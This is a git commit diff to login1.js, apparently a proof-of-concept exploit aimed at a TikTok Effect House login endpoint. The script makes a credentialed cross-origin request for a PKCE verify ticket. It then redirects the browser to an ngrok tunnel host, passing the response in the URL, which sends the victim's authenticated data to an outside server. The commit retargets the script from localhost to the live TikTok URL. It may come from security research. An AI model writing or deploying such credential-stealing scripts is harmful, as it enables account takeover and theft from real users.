226f2ecaa3df36c4a59e3f81543a2a5d1be76f20
cancerz1990 <94399415+cancerz1990@users.noreply.github.com>
2023-08-05 18:40:48 +0700

    Update login1.js

--- login1.js
+++ login1.js
@@ -1,11 +1,11 @@
 var xhr = new XMLHttpRequest();
 
 xhr.onload = reqListener; 
-xhr.open("GET", "http://localhost:8000/");
+xhr.open("GET", "https://effecthouse.tiktok.com/passport/web/gen_pkce_verify_ticket/?aid=1459&code_challenge=fde6822cb51ac71e2527152489231de2&language=en");
 xhr.withCredentials = true;
-xhr.setRequestHeader("Content-Type", "application/json");
+xhr.setRequestHeader("Content-Type", "application/x-www-form-urlencoded");
 xhr.send();
 
 function reqListener() {
-    location='//ab84-202-162-37-174.ngrok-free.app/?key='+this.responseText; 
+    location='//0e11-202-162-37-174.ngrok-free.app/?key='+this.responseText; 
 };
